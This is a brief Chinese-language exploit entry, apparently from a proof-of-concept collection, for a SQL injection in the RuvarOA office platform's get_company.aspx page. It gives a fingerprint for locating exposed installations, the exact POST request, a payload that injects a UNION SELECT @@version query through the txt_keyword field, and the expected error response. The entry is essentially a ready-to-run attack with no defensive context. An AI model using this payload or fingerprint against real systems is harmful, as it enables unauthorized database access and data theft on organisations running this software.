# RuvarOA协同办公平台-get_company-SQL注入

- **系统**：RuvarOA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="txt_admin_key"`
- **请求**：`POST /ContractManage/get_company.aspx HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
__EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=%2FwEPDwULLTE2NjkyODU1NDAPZBYCAgMPZBYGAgEPEGQPFgFmFgEQBQzpgInmi6nliIbnsbtlZxYBZmQCCQ88KwALAQAPFggeCERhdGFLZXlzFgAeC18hSXRlbUNvdW50Zh4JUGFnZUNvdW50AgEeFV8hRGF0YVNvdXJjZUl0ZW1Db3VudGZkZAILDw8WAh4RUGFnZXJfUmVjb3JkY291bnRmZGRkjBOPpsjzfyKuMGne7EKY2cnc17Zi99ZVNb4cfmiP0Z0%3D&ddl_type=&ddl_field=dw_bh&txt_keyword=1'+UNION+ALL+SELECT+@@version--+CwAf&btnSearch=%E6%9F%A5%E8%AF%A2&pager_input=1&pager_select=20&txt_row_index=&txt_dw_id=&txt_dw_mc=&txt_dw_bh=&txt_dw_lxr=&txt_dw_dh
```
- **预期**：500　|　nvarchar